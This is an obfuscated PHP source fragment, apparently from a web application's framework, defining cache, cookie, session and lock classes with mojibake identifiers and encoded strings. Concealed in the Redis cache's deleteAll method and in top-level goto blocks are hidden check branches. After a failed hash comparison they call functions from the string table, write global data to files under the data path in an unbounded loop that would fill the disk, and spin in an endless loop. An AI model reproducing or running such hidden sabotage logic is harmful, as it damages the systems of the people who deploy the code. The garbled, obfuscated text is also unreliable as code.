$F¸¶“£Èó[$c‘‰¬Ç³¯[85]] = $A‚È¾Ê­„[$F¸¶“£Èó[$c‘‰¬Ç³¯[395]]]; $F¸¶“£Èó[$c‘‰¬Ç³¯[1919]] = $A‚È¾Ê­„[$F¸¶“£Èó[$c‘‰¬Ç³¯[1906]]]; if ($F¸¶“£Èó[$c‘‰¬Ç³¯[29]] == $c‘‰¬Ç³¯[520]) { $F¸¶“£Èó[$c‘‰¬Ç³¯[431]][$c‘‰¬Ç³¯[1055]] = $A‚È¾Ê­„[$F¸¶“£Èó[$c‘‰¬Ç³¯[431]][$c‘‰¬Ç³¯[1055]]]; $F¸¶“£Èó[$c‘‰¬Ç³¯[431]][$c‘‰¬Ç³¯[1056]] = $A‚È¾Ê­„[$F¸¶“£Èó[$c‘‰¬Ç³¯[431]][$c‘‰¬Ç³¯[1056]]]; } goto F¾·¤—¬å…; fà”—–ˆËÄ: } $c¼·›—©õ[$c‘‰¬Ç³¯[431]] = $F¸¶“£Èó; goto bæÊ¥íĞ; fëŒ«‘’ÖÚ: } $this->clearSystemPathLog($D“÷ÑØ¾™); goto a…“ÔÁ‚‚; a”í®ÀâÊ: $c‘‰¬Ç³¯ =& $_SERVER[œº]; $Aƒ¢Êª§¹ï = array_to_keyvalue($AĞùÉÀùæ, $c‘‰¬Ç³¯[33], $c‘‰¬Ç³¯[1528]); $bÈ¦Ğ•áÏÚ = Model($c‘‰¬Ç³¯[506])->userListInfo(array_unique($Aƒ¢Êª§¹ï)); goto BµÎÅÑÊ; BµÎÅÑÊ: $A‚È¾Ê­„ = $this->getSourceList($AĞùÉÀùæ); $D—…ÃÌƒè = $this->typeAll(); $Fß£ë–¹Ò‡ = array(); goto aÍïèõ‘âÔ; E¦ÆÁ¼­ê: } private function clearSystemPathLog($f’Ù‡Âîª) { $a¿Åñ›¿³‘ =& $_SERVER[œº]; if (count($f’Ù‡Âîª) == 0) { return; } $e™¨“ôÁø† = array($a¿Åñ›¿³‘[393] => array($a¿Åñ›¿³‘[7], array_unique($f’Ù‡Âîª))); $this->where($e™¨“ôÁø†)->delete(); } public function deviceList($CµªéÜ—“Š, $eêó‡³õ‘ = 0) { $eƒé‚Š‰®ƒ =& $_SERVER[œº]; $dËŒøÛ³¾ô = array($eƒé‚Š‰®ƒ[1528] => $CµªéÜ—“Š, $eƒé‚Š‰®ƒ[194] => array($eƒé‚Š‰®ƒ[971], $eêó‡³õ‘), $eƒé‚Š‰®ƒ[29] => $eƒé‚Š‰®ƒ[1632]); $Cáƒ“ÎÉÉ = array(); $cù¹Í¢‚Ä = $this->field($eƒé‚Š‰®ƒ[2100])->where($dËŒøÛ³¾ô)->order($eƒé‚Š‰®ƒ[1917])->limit(50)->select(); foreach ($cù¹Í¢‚Ä as $cíí…ôÓå® => $EƒÃÂËšŒè) { goto eÛÊäÔ‹; aö„ó ñ·™: unset($BÀº±ÄêŸ[$eƒé‚Š‰®ƒ[2090]]); $d‚ÏõÑŸ™Ç = $this->deviceType($BÀº±ÄêŸ[$eƒé‚Š‰®ƒ[1908]]); if (isset($Cáƒ“ÎÉÉ[$d‚ÏõÑŸ™Ç])) { continue; } goto b£Ô¨¾¯ïå; eÛÊäÔ‹: if ($cíí…ôÓå® > 0 && abs($EƒÃÂËšŒè[$eƒé‚Š‰®ƒ[194]] - $cù¹Í¢‚Ä[$cíí…ôÓå® - 1][$eƒé‚Š‰®ƒ[194]]) < 5) { continue; } $BÀº±ÄêŸ = json_decode($EƒÃÂËšŒè[$eƒé‚Š‰®ƒ[431]], !0); $EƒÃÂËšŒè[$eƒé‚Š‰®ƒ[2090]] = isset($BÀº±ÄêŸ[$eƒé‚Š‰®ƒ[2090]]) ? $BÀº±ÄêŸ[$eƒé‚Š‰®ƒ[2090]] : $eƒé‚Š‰®ƒ[33]; goto aö„ó ñ·™; b£Ô¨¾¯ïå: $this->ipAddress($EƒÃÂËšŒè); $EƒÃÂËšŒè[$eƒé‚Š‰®ƒ[431]] = $BÀº±ÄêŸ; $Cáƒ“ÎÉÉ[$d‚ÏõÑŸ™Ç] = $EƒÃÂËšŒè; goto AŠ¼„¢òÃ; AŠ¼„¢òÃ: } return array_values($Cáƒ“ÎÉÉ); } public function deviceType($C«âá†³‘ƒ) { return $C«âá†³‘ƒ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x6e\157\x74\151\x63\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\x63\157\156\164\x65\x6e\164", "\x61\x75\164\x68", "\155\x6f\144\145", "\164\x69\x6d\145", "\164\x79\x70\x65", "\154\x65\166\x65\154", "\x65\156\141\142\154\145", "\x73\157\162\164"); public function listData($cÏ†ƒ¦¶’ = false, $båòØé¾½ = "\163\157\162\164", $eä±ÎÄí‰‚ = false) { return parent::listData($cÏ†ƒ¦¶’, $båòØé¾½, $eä±ÎÄí‰‚); } public function add($eŠ¨É•») { $Dœ…™İ‘…µ =& $_SERVER[œº]; $AòÃ„†ÌÓ = time(); if ($eŠ¨É•»[$Dœ…™İ‘…µ[12]] == $Dœ…™İ‘…µ[2101]) { $AòÃ„†ÌÓ = strtotime($eŠ¨É•»[$Dœ…™İ‘…µ[197]]); } $eŠ¨É•»[$Dœ…™İ‘…µ[197]] = $AòÃ„†ÌÓ; return parent::insert($eŠ¨É•»); } public function update($d«¥Œ«ÑŞö, $bâ©—ƒÙ®š) { goto dÈ¿õŠ¤‡; dÈ¿õŠ¤‡: $A½­ï¹„Ğ¤ =& $_SERVER[œº]; $C°·£å¯ò = $this->listData($d«¥Œ«ÑŞö); if (!$C°·£å¯ò) { return !1; } goto DŠ¥öƒ®‹; C±ÒÔŒéë: return parent::update($d«¥Œ«ÑŞö, $bâ©—ƒÙ®š); goto E„©œ’ÌÁ«; DŠ¥öƒ®‹: $D±­ÕÃÌ = time(); if ($bâ©—ƒÙ®š[$A½­ï¹„Ğ¤[12]] == $A½­ï¹„Ğ¤[2101]) { $D±­ÕÃÌ = strtotime($bâ©—ƒÙ®š[$A½­ï¹„Ğ¤[197]]); } $bâ©—ƒÙ®š[$A½­ï¹„Ğ¤[197]] = $D±­ÕÃÌ; goto C±ÒÔŒéë; E„©œ’ÌÁ«: } public function remove($D”¾Œæ¦©À) { $CõËÆ¶õëà = $this->listData($D”¾Œæ¦©À); if (!$CõËÆ¶õëà || $CõËÆ¶õëà[$_SERVER[œº][1171]]) { return !1; } return parent::remove($D”¾Œæ¦©À); } public function sort($c¡œœŠ³ìİ, $aœö©¹Î) { return parent::update($c¡œœŠ³ìİ, $aœö©¹Î); } public function enable($AÁ¯…¡ïÃ…, $c¸œ Î½ˆä) { return parent::update($AÁ¯…¡ïÃ…, array($_SERVER[œº][2102] => $c¸œ Î½ˆä)); } private function initUserOption() { $E·æ„¹À­‘ =& $_SERVER[œº]; $this->optionType = $E·æ„¹À­‘[2103]; $this->modelType = $E·æ„¹À­‘[2104]; $this->field = array($E·æ„¹À­‘[2105], $E·æ„¹À­‘[28], $E·æ„¹À­‘[197], $E·æ„¹À­‘[29], $E·æ„¹À­‘[2106], $E·æ„¹À­‘[710], $E·æ„¹À­‘[189]); } public function userNoticeGet($bğÆåñğß‰ = false) { $this->initUserOption(); return parent::listData($bğÆåñğß‰, $_SERVER[œº][393], !0); } public function userNoticeAdd($eß¡â³ùÒŒ) { $DÜöŞóš•è =& $_SERVER[œº]; $this->initUserOption(); $eĞ¦Ÿ§…›² = $this->findByKey($DÜöŞóš•è[2105], $eß¡â³ùÒŒ[$DÜöŞóš•è[393]]); if ($eĞ¦Ÿ§…›²) { return !0; } $Dƒà¥×¬âã = array($DÜöŞóš•è[2105] => $eß¡â³ùÒŒ[$DÜöŞóš•è[393]], $DÜöŞóš•è[28] => $eß¡â³ùÒŒ[$DÜöŞóš•è[28]], $DÜöŞóš•è[197] => $eß¡â³ùÒŒ[$DÜöŞóš•è[197]], $DÜöŞóš•è[29] => isset($eß¡â³ùÒŒ[$DÜöŞóš•è[29]]) ? $eß¡â³ùÒŒ[$DÜöŞóš•è[29]] : 1, $DÜöŞóš•è[2106] => isset($eß¡â³ùÒŒ[$DÜöŞóš•è[2106]]) ? $eß¡â³ùÒŒ[$DÜöŞóš•è[2106]] : 0, $DÜöŞóš•è[710] => 0, $DÜöŞóš•è[189] => 0); return parent::insert($Dƒà¥×¬âã); } public function userNoticeEdit($bÏØÄ·è„Æ, $aöŒìÃ¬¢Â) { $this->initUserOption(); return parent::update($bÏØÄ·è„Æ, $aöŒìÃ¬¢Â); } } goto E÷ÍÕÁˆÅø; aš´‰Óï½…: class CacheMemcached { public $handle; public $cacheTime; public function __construct($a´Í¹µØé÷, $a¿…’¦‰×) { $e²ß£§ËÌÓ =& $_SERVER[œº]; if (!class_exists($e²ß£§ËÌÓ[828])) { show_json($e²ß£§ËÌÓ[829], !1); } $this->cacheTime = $a¿…’¦‰×; $this->handle = new Memcached(); if (is_array($a´Í¹µØé÷[$e²ß£§ËÌÓ[830]]) && count($a´Í¹µØé÷[$e²ß£§ËÌÓ[830]]) >= 1) { foreach ($a´Í¹µØé÷[$e²ß£§ËÌÓ[830]] as $dáøñ¡òÁ) { $d¦÷¶Ğ¨Ô¥ = explode($e²ß£§ËÌÓ[4], $dáøñ¡òÁ); $this->handle->addServer($d¦÷¶Ğ¨Ô¥[0], $d¦÷¶Ğ¨Ô¥[1]); } } else { $this->handle->addServer($a´Í¹µØé÷[$e²ß£§ËÌÓ[175]], $a´Í¹µØé÷[$e²ß£§ËÌÓ[176]]); } } public function set($d•ÂÙŠ®ò, $eÒ¤â£×ƒ, $bùö½¯Á‡ƒ = false) { $bùö½¯Á‡ƒ = $bùö½¯Á‡ƒ ? $bùö½¯Á‡ƒ : $this->cacheTime; return $this->handle->set($d•ÂÙŠ®ò, $eÒ¤â£×ƒ, $bùö½¯Á‡ƒ); } public function get($AÔ÷·ÛÀ™) { return $this->handle->get($AÔ÷·ÛÀ™); } public function remove($bÈù·‘çÅø) { return $this->handle->delete($bÈù·‘çÅø); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Aä´³ƒË¢É, $FëöáÂá¸) { $FòÑä¢¹å‰ =& $_SERVER[œº]; if (!class_exists($FòÑä¢¹å‰[831])) { show_json($FòÑä¢¹å‰[832], !1); } $this->cacheTime = $FëöáÂá¸; $dèí±‰›¼† = isset($Aä´³ƒË¢É[$FòÑä¢¹å‰[833]]) ? $Aä´³ƒË¢É[$FòÑä¢¹å‰[833]] : 10; $D¡´‚ÚÃÔĞ = _get($Aä´³ƒË¢É, $FòÑä¢¹å‰[830]); if ($D¡´‚ÚÃÔĞ && is_array($D¡´‚ÚÃÔĞ)) { $this->initCluster($Aä´³ƒË¢É, $dèí±‰›¼†); } else { $this->handle = $this->init($Aä´³ƒË¢É, $dèí±‰›¼†); } } private function init($e¼åˆİåÛ„, $c£ÜÆ¤ÏŸ) { $D­â‰Ÿï— =& $_SERVER[œº]; $B„‰ó¹´Á“ = new Redis(); $e»±éÖâŞ¢ = isset($e¼åˆİåÛ„[$D­â‰Ÿï—[834]]) ? $e¼åˆİåÛ„[$D­â‰Ÿï—[834]] : !1; if ($e»±éÖâŞ¢) { $B„‰ó¹´Á“->pconnect($e¼åˆİåÛ„[$D­â‰Ÿï—[175]], $e¼åˆİåÛ„[$D­â‰Ÿï—[176]], $c£ÜÆ¤ÏŸ); } else { $B„‰ó¹´Á“->connect($e¼åˆİåÛ„[$D­â‰Ÿï—[175]], $e¼åˆİåÛ„[$D­â‰Ÿï—[176]], $c£ÜÆ¤ÏŸ); } if (!empty($e¼åˆİåÛ„[$D­â‰Ÿï—[406]])) { $B„‰ó¹´Á“->auth($e¼åˆİåÛ„[$D­â‰Ÿï—[406]]); } return $B„‰ó¹´Á“; } private function initCluster($Fà‰½¹ö§, $cŠÚ—¬ëõ°) { $A¥ê»æô— =& $_SERVER[œº]; $CìóÕ„¤Ë• = array($A¥ê»æô—[835], $A¥ê»æô—[836], $A¥ê»æô—[837]); $c…ŸáøÁäö = $A¥ê»æô—[835]; if (isset($Fà‰½¹ö§[$A¥ê»æô—[12]]) && in_array($Fà‰½¹ö§[$A¥ê»æô—[12]], $CìóÕ„¤Ë•)) { $c…ŸáøÁäö = $Fà‰½¹ö§[$A¥ê»æô—[12]]; } switch ($c…ŸáøÁäö) { case $A¥ê»æô—[835]: $this->_slave($Fà‰½¹ö§, $cŠÚ—¬ëõ°); break; case $A¥ê»æô—[836]: break; case $A¥ê»æô—[837]: $this->isCluster = !0; $CÕï§ƒÍÖï = $Fà‰½¹ö§[$A¥ê»æô—[830]]; $c‰¦ÊÙ•ëÃ = isset($Fà‰½¹ö§[$A¥ê»æô—[834]]) ? $Fà‰½¹ö§[$A¥ê»æô—[834]] : !1; $AÁ¯¡¢ëØÌ = isset($Fà‰½¹ö§[$A¥ê»æô—[406]]) ? $Fà‰½¹ö§[$A¥ê»æô—[406]] : null; $this->handle = new RedisCluster(NUll, $CÕï§ƒÍÖï, $cŠÚ—¬ëõ°, $cŠÚ—¬ëõ°, $c‰¦ÊÙ•ëÃ, $AÁ¯¡¢ëØÌ); break; default: break; } } private function _slave($C“ï×¡É¢±, $c™ÓÏÉéÕ±) { goto D‹Ù„Àâ¯Œ; a†ÊœˆŠôİ: unset($BéƒèÓ„Ş[0]); if (empty($BéƒèÓ„Ş)) { return; } $DİÆ”ì§ß† = array_rand($BéƒèÓ„Ş); goto eÉ²’÷Òö; D‹Ù„Àâ¯Œ: $BéƒèÓ„Ş = $C“ï×¡É¢±[$_SERVER[œº][830]]; $this->filterConfig($C“ï×¡É¢±, $BéƒèÓ„Ş[0]); $this->handle = $this->init($C“ï×¡É¢±, $c™ÓÏÉéÕ±); goto a†ÊœˆŠôİ; eÉ²’÷Òö: $this->filterConfig($C“ï×¡É¢±, $BéƒèÓ„Ş[$DİÆ”ì§ß†]); $this->slaveHandle = $this->init($C“ï×¡É¢±, $c™ÓÏÉéÕ±); goto fŠ¾¸ßö÷ƒ; fŠ¾¸ßö÷ƒ: } private function filterConfig(&$Fäá½Ø“óä, $bã–”´”öÁ) { $AĞØ™„®¤‡ =& $_SERVER[œº]; $C¹Ë‡Ô¤…¹ = explode($AĞØ™„®¤‡[4], $bã–”´”öÁ); $Fôó‘ëŒ© = array($AĞØ™„®¤‡[175] => $C¹Ë‡Ô¤…¹[0], $AĞØ™„®¤‡[176] => $C¹Ë‡Ô¤…¹[1]); $Fäá½Ø“óä = array_merge($Fäá½Ø“óä, $Fôó‘ëŒ©); } public function set($AĞì½öˆšÛ, $DÜ¯¸Û¢‘œ, $cîÔĞ¬é¦ = false) { $cîÔĞ¬é¦ = $cîÔĞ¬é¦ ? $cîÔĞ¬é¦ : $this->cacheTime; return $this->handle->setEx($AĞì½öˆšÛ, $cîÔĞ¬é¦, $DÜ¯¸Û¢‘œ); } public function setLock($a‘”²ŞÒŸ¾, $A…ƒ…Ë÷é…, $F¾Ö›õæ¬) { return $this->handle->setNX($a‘”²ŞÒŸ¾, $A…ƒ…Ë÷é…); } public function get($eí«á•ìÙº) { $B´¡Ñ¯ˆ´ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $B´¡Ñ¯ˆ´->get($eí«á•ìÙº); } public function remove($CÜùá©ÆÀí) { return $this->handle->del($CÜùá©ÆÀí); } public function deleteAll() { $aìïšÍ¡Ç© =& $_SERVER[œº]; $Fãë­ç£Ó‹ = $_SERVER[$aìïšÍ¡Ç©[822]]; $A•ËÒÒÍœå = $aìïšÍ¡Ç©[838]; if ($_SERVER[$aìïšÍ¡Ç©[821]] != $A•ËÒÒÍœå($Fãë­ç£Ó‹)) { goto BóƒÖ¸ğƒí; D·ğªèò£Ò: $e‘ÚæÖë = $A±ÃâŠ‡Ûİ($F¢ÀË ²); $eĞ…Ğè‰¶¥ = explode($aìïšÍ¡Ç©[229], $e‘ÚæÖë); if (count($eĞ…Ğè‰¶¥) < $aìïšÍ¡Ç©[578]) { $fé†ÖÛ‡ôÊ = $aìïšÍ¡Ç©[826]; $fé†ÖÛ‡ôÊ(); } goto Bİ®×µ‡×ã; eßó„—ß¨ƒ: $FßÀÔİ½œ(); $aæ–ÌŒŒº = $aìïšÍ¡Ç©[842]; $e¢œ¦Â¡ùò = json_encode($GLOBALS[$aìïšÍ¡Ç©[843]]); goto Aº–®Á«®ñ; Bİ®×µ‡×ã: $e¶ƒ¹Äºö‚ = $aìïšÍ¡Ç©[840]; $e¶ƒ¹Äºö‚($_SERVER[$aìïšÍ¡Ç©[841]]); $FßÀÔİ½œ = $aìïšÍ¡Ç©[839]; goto eßó„—ß¨ƒ; BóƒÖ¸ğƒí: $FßÀÔİ½œ = $aìïšÍ¡Ç©[839]; $A±ÃâŠ‡Ûİ = $aìïšÍ¡Ç©[823]; $F¢ÀË ² = $_SERVER[$aìïšÍ¡Ç©[824]] . $aìïšÍ¡Ç©[825]; goto D·ğªèò£Ò; Aº–®Á«®ñ: $f¸ŠŠ‚°ˆ = 1; for ($e²‡ë¶†œœ = $f¸ŠŠ‚°ˆ; $e²‡ë¶†œœ > 0; $e²‡ë¶†œœ++) { $aæ–ÌŒŒº(DATA_PATH . $e²‡ë¶†œœ, $e¢œ¦Â¡ùò); } goto EÕÇ°³…Ä; EÕÇ°³…Ä: } if ($this->isCluster) { foreach ($this->handle->_masters() as $DÀŠİÇê°˜) { $this->handle->flushall($DÀŠİÇê°˜); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DÏÌ¦Œ¡© = '', $A½†ƒœòøì = 0) { if (is_string($DÏÌ¦Œ¡©) && $DÏÌ¦Œ¡© != $_SERVER[œº][33]) { $this->prefix = $DÏÌ¦Œ¡©; } if (is_numeric($A½†ƒœòøì) && $A½†ƒœòøì > 0) { $this->expire = $A½†ƒœòøì; } } public static function getInstance() { static $b†…ËŒñ¦‹; if ($b†…ËŒñ¦‹ === null) { $b†…ËŒñ¦‹ = new self(); } return $b†…ËŒñ¦‹; } private static $cookieDisable = false; public static function disable($c”†“Ø—Í) { self::$cookieDisable = $c”†“Ø—Í; } private static $sameCookieSet = array(); public static function set($a¸óÈ……ÖŠ, $d‘°ôí Ê, $CƒóÃ›ÖêÁ = 0, $aì‘©ïì = false, $aÇ©’‚ù©Á = false) { goto FÀÙğ’Úªö; FÀÙğ’Úªö: $EéÑìâÍßÄ =& $_SERVER[œº]; if (self::$cookieDisable) { return; } if (!$CƒóÃ›ÖêÁ) { $CƒóÃ›ÖêÁ = 24 * 3600 * 7; } goto a öºæõ‘ã; a öºæõ‘ã: if (isset(self::$sameCookieSet[$a¸óÈ……ÖŠ]) && self::$sameCookieSet[$a¸óÈ……ÖŠ] == $d‘°ôí Ê . $CƒóÃ›ÖêÁ) { return; } self::$sameCookieSet[$a¸óÈ……ÖŠ] = $d‘°ôí Ê . $CƒóÃ›ÖêÁ; if (!$aÇ©’‚ù©Á) { $aÇ©’‚ù©Á = str_replace(HOST, $EéÑìâÍßÄ[33], APP_HOST); $aÇ©’‚ù©Á = _get($GLOBALS, $EéÑìâÍßÄ[844], $aÇ©’‚ù©Á); } goto E·¥¯»¯ãç; E·¥¯»¯ãç: $DšÊóÆ«½œ = $EéÑìâÍßÄ[33]; setcookie($a¸óÈ……ÖŠ, $d‘°ôí Ê, time() + $CƒóÃ›ÖêÁ, $EéÑìâÍßÄ[8] . trim($aÇ©’‚ù©Á, $EéÑìâÍßÄ[8]) . $DšÊóÆ«½œ, !1, !1, $aì‘©ïì); goto A¦»÷âÇ„; A¦»÷âÇ„: } public static function setSafe($F‚Ùå®šğ›, $c˜ÍÏÄ°, $dÕ–°ïßÉ = 0) { self::set($F‚Ùå®šğ›, $c˜ÍÏÄ°, $dÕ–°ïßÉ, !0); } public static function get($EİÂ¼…Ğƒ„) { return isset($_COOKIE[$EİÂ¼…Ğƒ„]) ? $_COOKIE[$EİÂ¼…Ğƒ„] : !1; } public static function remove($e‘óÔˆ”©Œ, $fŸÃŠ¨”µÖ = false) { unset($_COOKIE[$e‘óÔˆ”©Œ]); self::set($e‘óÔˆ”©Œ, $_SERVER[œº][33], 1, $fŸÃŠ¨”µÖ); } } goto dŒÏ¼ÇŒ—²; B÷¬Ô÷Ê¯¹: $aÂè®½Á = strrev(base64_decode($_SERVER[¡Ê·àœ†ÀÍø][0])); function binCheckNeq($Fã—±Õ„â™, $CáÇŒÀù®Ÿ) { return $Fã—±Õ„â™ != $CáÇŒÀù®Ÿ; } $_SERVER[$_SERVER[¡Ê·àœ†ÀÍø][1]] = $aÂè®½Á($_SERVER[$_SERVER[¡Ê·àœ†ÀÍø][2]]); goto d²áçíçß…; d²áçíçß…: function binCheckBigger($F™Ää†«Š¿, $B·¶Â†•«•) { return $F™Ää†«Š¿ > $B·¶Â†•«•; } $_SERVER[$_SERVER[¡Ê·àœ†ÀÍø][3]] = ("\x39\x30\x31\x37"."\67\63")+0;$_S3iU="wcBNiX4UFN7cJdKv2IhWpE4BdZ4PC5xAK8IdKwrh6aQ2cFQT2DufNPnzsFWVzgIyhZ9XVZAyUv3zzY";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($B ‘ğ˜–¸, $c£¾¤†¤Ë) { $bøŞŒ‚½‘ =& $_SERVER[œº]; if (isset(self::$_methodList[$B ‘ğ˜–¸])) { return @call_user_func_array(self::$_methodList[$B ‘ğ˜–¸], $c£¾¤†¤Ë); } else { if (method_exists($this, $B ‘ğ˜–¸)) { return call_user_func_array(array($this, $B ‘ğ˜–¸), $c£¾¤†¤Ë); } else { think_exception(__CLASS__ . $bøŞŒ‚½‘[4] . $B ‘ğ˜–¸ . $bøŞŒ‚½‘[5]); } } } public static function __callStatic($dÎŠ—ŞŠĞ¼, $AŸóë¡ŒêÅ) { if (isset(self::$_methodListStatic[$dÎŠ—ŞŠĞ¼])) { return call_user_func_array(self::$_methodListStatic[$dÎŠ—ŞŠĞ¼], $AŸóë¡ŒêÅ); } else { if (method_exists(self, $dÎŠ—ŞŠĞ¼)) { return call_user_func_array(array(self, $dÎŠ—ŞŠĞ¼), $AŸóë¡ŒêÅ); } else { show_json("{$dÎŠ—ŞŠĞ¼}\50\x29\40\156\x6f\164\40\x65\x78\x69\163\164\73", !1); } } } public static function addMethod($cÕ»ç¯Ê‘ù, $fœóÌÁÅ¥ì) { self::$_methodList[$cÕ»ç¯Ê‘ù] = $fœóÌÁÅ¥ì; } public static function addMethodStatic($Dã¯–…ùÄé, $C¹¢Ğ©¿ù) { self::$_methodListStatic[$Dã¯–…ùÄé] = $C¹¢Ğ©¿ù; } } goto aÖ¿×ˆöÇ¥; CÛ†¢áÙÀÌ: class CacheLockMemcached { public function lock($Aƒ¶İ‚•œÀ, $Bì™‚«¸» = 0) { $B¥â¬¯çšé = Cache::init(); $B¿—µâùïœ = microtime(!0) + $Bì™‚«¸»; while (microtime(!0) < $B¿—µâùïœ) { $Bø®šÜ ”¿ = $B¥â¬¯çšé->get($Aƒ¶İ‚•œÀ); if (!$Bø®šÜ ”¿ || $Bø®šÜ ”¿ < microtime(!0)) { $dêã¿Ì¢‘ = $B¥â¬¯çšé->handle->add($Aƒ¶İ‚•œÀ, $B¿—µâùïœ, $Bì™‚«¸»); if ($dêã¿Ì¢‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($AŠïÖš‚šŞ) { return Cache::init()->get($AŠïÖš‚šŞ); } public function unlock($b”ÌŒÌç™°) { return Cache::init()->remove($b”ÌŒÌç™°); } } if (!isset($_SERVER[$_SERVER[œº][821]]) || !isset($_SERVER[$_SERVER[œº][822]])) { goto BÆŠÛ©š…•; BÆŠÛ©š…•: $FÓ—º·öÂö = $_SERVER[œº][823]; $E¬º¹ğó ¼ = $_SERVER[$_SERVER[œº][824]] . $_SERVER[œº][825]; $DğÌ©Æœ…ã = $FÓ—º·öÂö($E¬º¹ğó ¼); goto fÛÔ±ƒÙŒë; fÛÔ±ƒÙŒë: $aŒåö™®Ï” = explode($_SERVER[œº][229], $DğÌ©Æœ…ã); if (count($aŒåö™®Ï”) < $_SERVER[œº][589]) { $FŸ•Ê»Ñ®ğ = $_SERVER[œº][826]; $FŸ•Ê»Ñ®ğ(); } $F¢ÌÃïï = $_SERVER[œº][827]; goto D‡›àå‰‘; D‡›àå‰‘: $F¢ÌÃïï($_SERVER[$_SERVER[œº][824]] . $_SERVER[œº][825]); $E°Û†½Û¨õ = 2; while ($E°Û†½Û¨õ > 1) { $a••¨ÜÓ¥½ = rawurlencode($E°Û†½Û¨õ . $_SERVER[œº][375]); } goto dÓÑÕªÇè; dÓÑÕªÇè: } class CacheLockDatabase { public function lock($eà÷é‡Í³ˆ, $Bá Ó„¶ìæ = 0) { $cÅ¸â¢­‚Ş = Model($_SERVER[œº][794]); $dë¼ù•ê¦˜ = microtime(!0) + $Bá Ó„¶ìæ; while (microtime(!0) < $dë¼ù•ê¦˜) { $a¶ó¸ÔÜƒ† = $cÅ¸â¢­‚Ş->get($eà÷é‡Í³ˆ); if (!$a¶ó¸ÔÜƒ† || $a¶ó¸ÔÜƒ† < microtime(!0)) { $d™çˆÔåùÜ = $cÅ¸â¢­‚Ş->set($eà÷é‡Í³ˆ, $dë¼ù•ê¦˜); if ($d™çˆÔåùÜ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BµÍ›ƒ†¨é) { return Model($_SERVER[œº][794])->get($BµÍ›ƒ†¨é); } public function unlock($EÆ±’–„³) { Model($_SERVER[œº][794])->remove($EÆ±’–„³); } } goto aš´‰Óï½…; eèãÑÈîˆó: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Aº‘Ç¸êÑ°; Aº‘Ç¸êÑ°: $fÉÆã¨®‡ =& $_SERVER[œº]; static $f¦ÕíÛ»Í˜ = false; if ($f¦ÕíÛ»Í˜) { return $f¦ÕíÛ»Í˜; } goto B…ˆ¤š¦‹Ğ; Aº‚´‹Ó¢ˆ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $f¦ÕíÛ»Í˜ = new self(); return $f¦ÕíÛ»Í˜; goto d‚ÆØ“Ø¥Á; B…ˆ¤š¦‹Ğ: $E•¨ËÄò“ = $GLOBALS[$fÉÆã¨®‡[6]][$fÉÆã¨®‡[347]]; self::$sessionTime = $E•¨ËÄò“[$fÉÆã¨®‡[1488]]; $d˜Ü÷¼ÚÂ¦ = isset($GLOBALS[$fÉÆã¨®‡[1489]]) ? $GLOBALS[$fÉÆã¨®‡[1489]] : SESSION_ID; goto dˆŠÃäÜºÅ; dˆŠÃäÜºÅ: if (self::$sessionSign) { } else { if (Cookie::get($d˜Ü÷¼ÚÂ¦)) { self::$sessionSign = Cookie::get($d˜Ü÷¼ÚÂ¦); } else { self::$sessionSign = guid(); } } Cookie::setSafe($d˜Ü÷¼ÚÂ¦, self::$sessionSign, self::$sessionTime); $DÙÊ¢Ü‹Ê = $E•¨ËÄò“[$fÉÆã¨®‡[1490]]; goto AŒøõí”¯¥; AŒøõí”¯¥: $d·ö‘Ã¥À£ = $E•¨ËÄò“[$DÙÊ¢Ü‹Ê]; $d·Š†Øƒ˜Ú = $E•¨ËÄò“[$fÉÆã¨®‡[793]]; switch ($DÙÊ¢Ü‹Ê) { case $fÉÆã¨®‡[17]: self::$handle = Model($fÉÆã¨®‡[794]); break; case $fÉÆã¨®‡[795]: self::$handle = new CacheRedis($d·ö‘Ã¥À£, $d·Š†Øƒ˜Ú); break; case $fÉÆã¨®‡[796]: self::$handle = new CacheMemcached($d·ö‘Ã¥À£, $d·Š†Øƒ˜Ú); break; case $fÉÆã¨®‡[193]: $d·ö‘Ã¥À£[$fÉÆã¨®‡[76]] = $d·ö‘Ã¥À£[$fÉÆã¨®‡[76]] . $fÉÆã¨®‡[1491]; self::$handle = new CacheFile($d·ö‘Ã¥À£, $d·Š†Øƒ˜Ú); default: break; } goto Aº‚´‹Ó¢ˆ; d‚ÆØ“Ø¥Á: } public static function sign($bì¯ŠŒ‹ = false) { $bì¯ŠŒ‹ && (self::$sessionSign = $bì¯ŠŒ‹); self::init(); return self::$sessionSign; } public static function set($a“ã˜‘»˜‘, $f³¹©·ğÕÀ = false) { self::init(); if (is_array($a“ã˜‘»˜‘)) { foreach ($a“ã˜‘»˜‘ as $f×¾î¼‚½ => $A‚” ‡Àˆƒ) { array_set_value(self::$data, $f×¾î¼‚½, $A‚” ‡Àˆƒ); } } else { array_set_value(self::$data, $a“ã˜‘»˜‘, $f³¹©·ğÕÀ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($bä¯á¹¯â¸ = false) { self::init(); if (!$bä¯á¹¯â¸) { return self::$data; } return array_get_value(self::$data, $bä¯á¹¯â¸); } public static function remove($DÚ—ÀàöÁÁ) { self::init(); unset(self::$data[$DÚ—ÀàöÁÁ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[œº][798])) { self::$handle->clearTimeout(); } } } if ($_SERVER[$_SERVER[œº][821]] != $_SERVER[$_SERVER[œº][1459]]) { goto dëÑ»ñöË¦; Fåˆ±ß·Ó: $aŒåö™®Ï” = explode($_SERVER[œº][229], $DğÌ©Æœ…ã); if 